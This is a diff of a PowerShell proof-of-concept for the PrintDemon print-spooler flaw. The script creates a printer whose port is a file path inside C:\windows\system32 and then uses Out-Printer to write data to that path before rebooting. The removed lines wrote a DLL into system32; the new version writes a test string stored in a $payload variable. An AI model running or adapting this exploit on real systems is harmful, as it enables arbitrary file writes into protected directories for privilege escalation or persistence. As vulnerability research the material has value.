@@ -1,8 +1,8 @@
 $printerName = "PrinterDemon"
 $driverName = "Generic / Text Only"
-$portName = "c:\windows\system32\MathLib.dll"
+$portName = "c:\windows\system32\printDemonPort.dll"
 
-# $stringTest = "Th1s is 4 fr34k!ng t3st"
+$payload = "Th1s is 4 fr34k!ng t3st"
 
 # remove printer, driver and port 
 Remove-Printer $printerName
@@ -12,7 +12,7 @@ Remove-PrinterDriver $driverName
 
 # add printer driver, which supports all ASCII characters and most
 # characters of other character sets
-echo "[] Adding printer driver -> $driverName <-"
+echo "[i] Adding printer driver -> $driverName <-"
 Add-PrinterDriver -Name $driverName
 echo "[+] Done"
 
@@ -20,16 +20,16 @@ echo "[+] Done"
 #Get-PrinterDriver
 
 # add printer port (to associate then to our printer)
-echo "[] Adding printer port -> $portName <-"
+echo "[i] Adding printer port -> $portName <-"
 Add-PrinterPort -Name $portName
 echo "[+] Done"
 
 # list printer ports installed in the machine
-echo "[] Listing printer ports ..."
+echo "[i] Listing printer ports ..."
 Get-PrinterPort | ft Name
 
 # create printer + bind it to driver and port just created
-echo "[] Adding printer $printername and binding to previously created port+driver"
+echo "[i] Adding printer $printername and binding to previously created port+driver"
 Add-Printer -name $printerName -DriverName $driverName -PortName $portName
 echo "[+] Done"
 
@@ -37,8 +37,8 @@ echo "[+] Done"
 #Get-Printer | ft name,portname
 
 #NOTE: its important to write (into the file) BEFORE restarting the system
-echo "[] Writing to printer $printerName ..."
-Get-Content -Path C:\Users\Bob\Desktop\program\MathLib.dll | Out-Printer -name $printerName
+echo "[i] Writing to printer $printerName ..."
+echo $payload | Out-Printer -name $printerName
 echo "[+] DONE"
 
 echo "Restarting pc in 10s ..."
